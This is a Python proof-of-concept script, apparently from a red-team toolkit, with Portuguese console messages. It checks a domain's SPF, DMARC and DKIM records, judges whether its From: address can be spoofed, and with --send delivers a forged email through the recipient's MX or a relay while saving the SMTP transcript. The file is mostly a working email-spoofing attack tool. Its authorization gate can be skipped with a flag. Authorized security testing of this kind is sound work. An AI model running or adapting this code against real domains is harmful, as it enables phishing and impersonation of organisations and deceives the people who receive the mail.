#!/usr/bin/env python3
"""
email_spoof_poc.py — Evidência de exploração de SPF/DMARC/DKIM.

Sempre emite um verdito analítico de spoofing. Com --send (opt-in, atrás de
gate RoE), entrega um email forjado e captura o transcript SMTP como prova.

Uso de red team autorizado (RoE assinado). Console PT-BR; campos de evidência
em EN (padrão deliverable do suite).
"""
import argparse
import datetime
import email.message
import email.utils
import json
import os
import smtplib
import sys

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "lib"))


def compute_verdict(records, forged_from):
    """Mapeia status DNS → verdito de exploitabilidade de spoofing de From:."""
    spf = records["spf"]
    dmarc = records["dmarc"]
    dmarc_status = dmarc.get("status")
    dmarc_policy = dmarc.get("policy")

    if dmarc_status == "MISSING" or dmarc_policy == "none":
        status = "SPOOFABLE_INBOX"
        impact = "Forged From: of the exact domain is delivered to the inbox (DMARC absent or p=none)."
    elif dmarc_policy == "quarantine":
        status = "SPOOFABLE_SPAM"
        impact = "Forged mail is accepted but likely quarantined/spam-foldered (DMARC p=quarantine)."
    elif dmarc_policy == "reject":
        status = "BLOCKED_EXACT"
        impact = "Exact-domain spoofing blocked by DMARC p=reject; lookalike/cousin domains remain viable."
    else:
        status = "INDETERMINATE"
        impact = "DMARC policy unrecognized; manual review required."

    spf_note = None
    if spf.get("status") in ("MISSING", "PERMISSIVE", "NEUTRAL"):
        spf_note = "Envelope sender (MAIL FROM) is unprotected — eases envelope spoofing and backscatter."

    return {
        "status": status,
        "impact_en": impact,
        "spf_note_en": spf_note,
        "forged_envelope": {"mail_from": forged_from, "header_from": forged_from},
    }


def build_message(forged_from, to_addr, subject, body):
    """Monta o email forjado. Retorna (EmailMessage, message_id capturado)."""
    msg = email.message.EmailMessage()
    msg["From"] = forged_from
    msg["To"] = to_addr
    msg["Subject"] = subject
    msg["Date"] = email.utils.formatdate(localtime=True)
    msg_id = email.utils.make_msgid()
    msg["Message-ID"] = msg_id
    msg.set_content(body)
    return msg, msg_id


def parse_mx(dig_mx_output):
    """Parseia a saída de `dig +short MX` → lista de hosts ordenada por preferência."""
    hosts = []
    for line in dig_mx_output.splitlines():
        parts = line.split()
        if len(parts) == 2 and parts[0].isdigit():
            hosts.append((int(parts[0]), parts[1].rstrip(".")))
    hosts.sort()
    return [h for _, h in hosts]


def _decode(resp):
    return resp.decode(errors="replace") if isinstance(resp, (bytes, bytearray)) else str(resp)


def _require_ok(code, resp, label, ok=(250,)):
    """smtplib.mail()/rcpt() não lançam em 4xx/5xx — exige código 2xx ou aborta.

    Garante que 'accepted' reflita a aceitação real de cada estágio SMTP, e não
    apenas o código final do DATA (que pode mascarar uma rejeição em MAIL/RCPT).
    """
    if code not in ok:
        raise smtplib.SMTPException(f"{label} rejeitado: {code} {_decode(resp)}")


def _quiet_close(s):
    if s is not None:
        try:
            s.close()
        except Exception:
            pass


def deliver_direct(mx_hosts, helo, mail_from, rcpt_to, msg_bytes,
                   timeout=15, smtp_factory=smtplib.SMTP):
    """Entrega direta na porta 25, tentando cada MX. Captura o transcript."""
    transcript = []
    last_err = None
    for host in mx_hosts:
        s = None
        try:
            transcript.append(f"CONNECTING {host}:25")
            s = smtp_factory(host, 25, timeout=timeout)
            transcript.append(f"CONNECTED {host}:25")
            code, resp = s.ehlo(helo)
            transcript.append(f"EHLO {helo} -> {code} {_decode(resp)}")
            code, resp = s.mail(mail_from)
            transcript.append(f"MAIL FROM:<{mail_from}> -> {code} {_decode(resp)}")
            _require_ok(code, resp, "MAIL FROM")
            code, resp = s.rcpt(rcpt_to)
            transcript.append(f"RCPT TO:<{rcpt_to}> -> {code} {_decode(resp)}")
            _require_ok(code, resp, "RCPT TO", ok=(250, 251))
            code, resp = s.data(msg_bytes)
            transcript.append(f"DATA -> {code} {_decode(resp)}")
            accepted = code == 250
            # A mensagem já foi entregue: uma falha no QUIT não deve disparar
            # retry a outro MX (evita reenvio duplicado do email forjado).
            try:
                s.quit()
            except Exception:
                _quiet_close(s)
            return {"method": "direct", "mx_used": host, "accepted": accepted,
                    "transcript": transcript}
        except Exception as e:
            transcript.append(f"ERROR {host}: {e}")
            last_err = e
            _quiet_close(s)
            continue
    return {"method": "direct", "mx_used": None, "accepted": False,
            "transcript": transcript, "error": str(last_err) if last_err else None}


def deliver_relay(host, port, user, password, helo, mail_from, rcpt_to, msg_bytes,
                  timeout=15, smtp_factory=smtplib.SMTP):
    """Entrega via relay configurado (STARTTLS+login se user fornecido)."""
    transcript = []
    s = None
    try:
        transcript.append(f"CONNECTING relay {host}:{port}")
        s = smtp_factory(host, port, timeout=timeout)
        transcript.append(f"CONNECTED relay {host}:{port}")
        code, resp = s.ehlo(helo)
        transcript.append(f"EHLO {helo} -> {code} {_decode(resp)}")
        if user:
            s.starttls()
            code, resp = s.ehlo(helo)
            transcript.append(f"EHLO (post-STARTTLS) {helo} -> {code} {_decode(resp)}")
            s.login(user, password)
            transcript.append("STARTTLS + AUTH")
        code, resp = s.mail(mail_from)
        transcript.append(f"MAIL FROM:<{mail_from}> -> {code} {_decode(resp)}")
        _require_ok(code, resp, "MAIL FROM")
        code, resp = s.rcpt(rcpt_to)
        transcript.append(f"RCPT TO:<{rcpt_to}> -> {code} {_decode(resp)}")
        _require_ok(code, resp, "RCPT TO", ok=(250, 251))
        code, resp = s.data(msg_bytes)
        transcript.append(f"DATA -> {code} {_decode(resp)}")
        accepted = code == 250
        try:
            s.quit()
        except Exception:
            _quiet_close(s)
        return {"method": "relay", "mx_used": host, "accepted": accepted,
                "transcript": transcript}
    except Exception as e:
        transcript.append(f"ERROR relay {host}: {e}")
        _quiet_close(s)
        return {"method": "relay", "mx_used": host, "accepted": False,
                "transcript": transcript, "error": str(e)}


def roe_gate(forged_from, to_addr, method, assume_yes=False, interactive=None):
    """Confirma autorização antes de enviar. Falha segura se sem consentimento."""
    if interactive is None:
        interactive = sys.stdin.isatty()
    print("\n  [RoE] ENVIO DE EMAIL FORJADO — uso autorizado apenas")
    print(f"        Remetente forjado : {forged_from}")
    print(f"        Destinatário      : {to_addr}")
    print(f"        Método            : {method}")
    if assume_yes:
        return True
    if not interactive:
        print("  [RoE] Sem confirmação e sem terminal interativo — abortando envio.")
        return False
    try:
        ans = input("  [RoE] Digite EU AUTORIZO para confirmar a autorização: ")
    except EOFError:
        return False
    return ans.strip() == "EU AUTORIZO"


def write_evidence(outdir, domain, records, verdict, send):
    """Grava spoof_evidence.json e (se houve envio) smtp_transcript.txt."""
    os.makedirs(outdir, exist_ok=True)
    evidence = {
        "domain": domain,
        "timestamp": datetime.datetime.now().isoformat(timespec="seconds"),
        "dns_records": records,
        "verdict": verdict,
    }
    if send is not None:
        transcript = send.get("transcript", [])
        evidence["send"] = {k: v for k, v in send.items() if k != "transcript"}
        evidence["send"]["smtp_transcript"] = transcript
        with open(os.path.join(outdir, "smtp_transcript.txt"), "w") as f:
            f.write("\n".join(transcript) + "\n")
    with open(os.path.join(outdir, "spoof_evidence.json"), "w") as f:
        json.dump(evidence, f, ensure_ascii=False, indent=2)
    return evidence


def _default_outdir(domain):
    ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    return f"spoof_poc_{domain}_{ts}"


def parse_args(argv=None):
    p = argparse.ArgumentParser(description="Evidência de exploração de SPF/DMARC/DKIM (red team autorizado).")
    p.add_argument("domain", help="Domínio alvo (domínio forjado em From:/MAIL FROM)")
    p.add_argument("--dry-run", action="store_true", help="Mostra o envelope/headers sem enviar")
    p.add_argument("--send", action="store_true", help="Ativa entrega forjada (opt-in, exige RoE)")
    p.add_argument("--to", help="Destinatário (obrigatório com --send)")
    p.add_argument("--from", dest="from_addr", help="Remetente forjado (default: security-test@<domain>)")
    p.add_argument("--subject", default="[AUTHORIZED SECURITY TEST] Email spoofing PoC")
    p.add_argument("--body", default="This is an authorized email spoofing proof-of-concept. No action required.")
    p.add_argument("--body-file", help="Lê o corpo de um arquivo")
    p.add_argument("--smtp", help="Relay de fallback HOST[:PORT]")
    p.add_argument("--smtp-user")
    p.add_argument("--smtp-pass",
                   help="Senha do relay. Prefira a env STIGLITZ_SMTP_PASS (evita exposição em ps/history).")
    p.add_argument("--helo", default=None, help="Nome no EHLO/HELO (default: hostname local)")
    p.add_argument("--roe-accept", action="store_true",
                   help="AUTORIZA o envio sem prompt (RoE prévio; p/ CI com autorização). Equivale a digitar EU AUTORIZO.")
    p.add_argument("--outdir", default=None)
    return p.parse_args(argv)


def main(argv=None):
    import socket
    from email_security import analyze, dig

    args = parse_args(argv)
    domain = args.domain
    forged_from = args.from_addr or f"security-test@{domain}"
    outdir = args.outdir or _default_outdir(domain)

    print(f"  [*] Analisando autenticação de email de {domain} ...")
    records = analyze(domain)
    verdict = compute_verdict(records, forged_from)

    print(f"  [=] SPF: {records['spf']['status']} | DMARC: {records['dmarc']['status']} | DKIM: {records['dkim']['status']}")
    print(f"  [VERDITO] {verdict['status']} — {verdict['impact_en']}")
    if verdict["spf_note_en"]:
        print(f"            SPF: {verdict['spf_note_en']}")
    print(f"  [envelope] MAIL FROM:<{forged_from}>  From: {forged_from}")

    send = None
    if args.send or args.dry_run:
        if not args.to:
            print("  [!] --to é obrigatório com --send/--dry-run.")
            return 2
        if "@" not in args.to:
            print("  [!] --to requer o formato usuario@dominio.")
            return 2
        body = args.body
        if args.body_file:
            try:
                with open(args.body_file) as f:
                    body = f.read()
            except OSError as e:
                print(f"  [!] Não foi possível ler --body-file: {e}")
                return 2
        msg, msg_id = build_message(forged_from, args.to, args.subject, body)
        helo = args.helo or socket.getfqdn()

        if args.send and args.dry_run:
            print("  [!] --dry-run tem precedência: nada será enviado (--send ignorado).")

        if args.dry_run:
            print("\n  [DRY-RUN] Mensagem que SERIA enviada:")
            print("  " + "\n  ".join(msg.as_string().splitlines()))
            write_evidence(outdir, domain, records, verdict, None)
            print(f"\n  [✓] Evidência analítica em {outdir}/spoof_evidence.json")
            return 0

        method_desc = "direct-MX" + (" (fallback relay)" if args.smtp else "")
        if not roe_gate(forged_from, args.to, method_desc, assume_yes=args.roe_accept):
            return 1

        recipient_domain = args.to.split("@", 1)[1]
        mx_hosts = parse_mx(dig("MX", recipient_domain))
        msg_bytes = msg.as_bytes()

        result = {"accepted": False, "transcript": ["sem MX resolvido"]}
        if mx_hosts:
            result = deliver_direct(mx_hosts, helo, forged_from, args.to, msg_bytes)
        if not result["accepted"] and args.smtp:
            print("  [→] Entrega direta falhou — tentando relay configurado ...")
            host, _, port = args.smtp.partition(":")
            smtp_pass = args.smtp_pass or os.environ.get("STIGLITZ_SMTP_PASS")
            result = deliver_relay(host, int(port) if port else 587,
                                   args.smtp_user, smtp_pass, helo,
                                   forged_from, args.to, msg_bytes)

        send = {
            "recipient": args.to,
            "forged_from": forged_from,
            "mx_used": result.get("mx_used"),
            "delivery_method": result.get("method", "direct"),
            "message_id": msg_id,
            "accepted": result["accepted"],
            "transcript": result["transcript"],
        }
        status = "ACEITO (250)" if result["accepted"] else "REJEITADO/FALHOU"
        print(f"  [SMTP] {status} via {send['delivery_method']} (mx={send['mx_used']})")

    write_evidence(outdir, domain, records, verdict, send)
    print(f"  [✓] Evidência em {outdir}/spoof_evidence.json")
    return 0


if __name__ == "__main__":
    sys.exit(main())
